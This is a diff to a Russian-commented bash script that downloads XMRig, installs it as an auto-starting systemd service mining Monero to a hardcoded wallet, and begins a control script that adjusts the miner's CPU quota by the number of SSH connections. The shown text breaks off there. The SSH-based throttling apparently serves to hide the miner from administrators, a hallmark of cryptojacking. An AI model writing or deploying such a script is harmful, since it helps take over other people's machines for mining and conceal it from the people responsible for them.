@@ -1,9 +1,21 @@
 #!/bin/bash
 
-# Путь к исполняемому файлу XMRig и параметры запуска
-XMRIG_PATH="/usr/local/bin/xmrig"
+# Задаем переменные
+XMRIG_VERSION="6.15.0"
+XMRIG_DIR="/usr/local/xmrig"
+XMRIG_BIN="$XMRIG_DIR/xmrig"
 POOL="xmr-eu1.nanopool.org:14444"
 WALLET="4A9SeKhwWx8DtAboVp1e1LdbgrRJxvjEFNh4VNw1NDng6ELLeKJPVrPQ9n9eNc4iLVC4BKeR4egnUL68D1qUmdJ7N3TaB5w"
+CONTROL_SCRIPT="/usr/local/bin/xmrig_control.sh"
+
+# Создание директории для XMRig
+sudo mkdir -p $XMRIG_DIR
+
+# Загрузка и распаковка XMRig
+wget https://github.com/xmrig/xmrig/releases/download/v$XMRIG_VERSION/xmrig-$XMRIG_VERSION-linux-x64.tar.gz -O /tmp/xmrig.tar.gz
+tar -xzf /tmp/xmrig.tar.gz -C /tmp
+sudo mv /tmp/xmrig-$XMRIG_VERSION/xmrig $XMRIG_BIN
+sudo chmod +x $XMRIG_BIN
 
 # Создание системного сервиса для XMRig
 echo "[Unit]
@@ -11,7 +23,7 @@ Description=XMRig Miner
 After=network.target
 
 [Service]
-ExecStart=$XMRIG_PATH -o $POOL -u $WALLET --cpu-priority=5
+ExecStart=$XMRIG_BIN -o $POOL -u $WALLET --cpu-priority=5
 Nice=10
 CPUQuota=90%
 
@@ -26,7 +38,6 @@ sudo systemctl enable xmrig
 sudo systemctl start xmrig
 
 # Создание скрипта для управления нагрузкой XMRig в зависимости от SSH-подключений
-CONTROL_SCRIPT="/usr/local/bin/xmrig_control.sh"
 echo "#!/bin/bash
 
 # Функция для обновления CPUQuota в зависимости от количества SSH-подключений
